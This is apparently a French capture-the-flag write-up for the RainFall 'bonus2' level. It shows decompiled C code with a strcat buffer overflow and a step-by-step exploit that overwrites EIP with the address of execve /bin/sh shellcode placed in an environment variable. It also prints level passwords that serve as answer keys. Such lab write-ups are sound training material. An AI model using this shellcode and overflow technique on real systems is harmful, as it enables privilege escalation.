# Bonus2:

pass : `579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`

## Source :
```c
#include <string.h>
#include <stdlib.h>

int language = 0;  // 0x08049988

int		greetuser(char *name) {  // 0x08048484
	char str[72];  // ebp-0x48 == esp+0x10

	switch (language) {
		case 0:
			strcpy(str, "Hello ");
			break;
		case 1:
			strcpy(str, "Hyvää päivää ");
			break;
		case 2:
			strcpy(str, "Goedemiddag! ");
			break;
		default:
			break;
	}
	strcat(str, name);
	return (puts(str));
}

int		main(int ac, char **av) {  // 0x08048529
	char str[76];  // esp+0x50
	char str2[80];  // esp
	char *lang;  // esp+0x9c

	if (ac != 3)
		return 1;

	memset(str, '\0', 19);  // 0x13

	stpncpy(str, av[1], 40);  // 0x28
	strncpy(str + 40, av[2], 32);  // x020
	lang = getenv("LANG");
	if (*lang) {
		if (!memcmp(lang, "fi", 2)) {
			language = 1;
		} else {
			if (!memcmp(lang, "nl",2)) {
				language = 2;
			}
		}
	}
	for (int i = 0; i < 19; i++) {
		str2[i] = str[i];
	}

	return greetuser(str2);
}
```

## Recherche :

On remarque que si on a `lang == "fi"` ou `"nl"`, alors dans `greetuser`, la première partie de `str` sera plus longue et on va segfault.

Faisons alors `export LANG="fi"`

Maintenant, on voit que l'`EIP` est réécrite à partir de 16 caractères sur le second argument.
On doit aussi bien mettre 40 caractères pour le premièr argument afin que le second soit écrit.

On va maintenant procéder comme pour le `bonus0` en mettant un shellcode dans une variable qu'on va export, puis en indiquant cette adresse lors de l'écrasement de l'`EIP`

On va fait mettre notre shell code dans un `env` `EXPLOIT` :
```
export EXPLOIT="`python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`"`
```
Dans `/tmp`, on va créer un programme pour récupérer l'addresse :
`bonus2@RainFall:/tmp$ cat getenv.c`

```c
#include <stdio.h>
#include <stdlib.h>

int     main(int ac, char **av) {
        printf("%s is %p\n", av[1], getenv(av[1]));
        return 0;
}
```

`gcc getenv.c -o bonus2`

```
bonus2@RainFall:/tmp$ ./bonus2 EXPLOIT
EXPLOIT is 0xbffff918
```

On peut le retrouver également avec gdb avec la commande `x/1s *((char **)environ)` ou `x/s *environ`

En retournant dans le `~`, on va pouvoir executer notre programme en appelant notre shellcode :

```sh
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*18 + "\x18\xf9\xff\xbf"')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB▒���
$ whoami
bonus3
```

On est bon !

## Exploit :

```shell
bonus2@RainFall:~$ export LANG="fi"
bonus2@RainFall:~$ export EXPLOIT="`python -c 'print "\x90"*4096+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`"
bonus2@RainFall:~$ gdb ./bonus2
(gdb) b main
Breakpoint 1 at 0x804852f
(gdb) r
Starting program: /home/user/bonus2/bonus2

Breakpoint 1, 0x0804852f in main ()
(gdb) x/1s *environ
0xbfffe8f4:      "EXPLOIT=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
(gdb) p/x 0xbfffe8f4+512
$1 = 0xbfffeaf4
(gdb) q
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*18 + "\xf4\xea\xff\xbf"')Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB����
$ whoami
bonus3
$ cd ../bonus3
$ cat .pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

> Dans l'exploit, on rajoute un offset au shellcode pour être sûr de ne pas avoir de mauvaise surprise par rapport à un éventuel décalage de la mémoire.
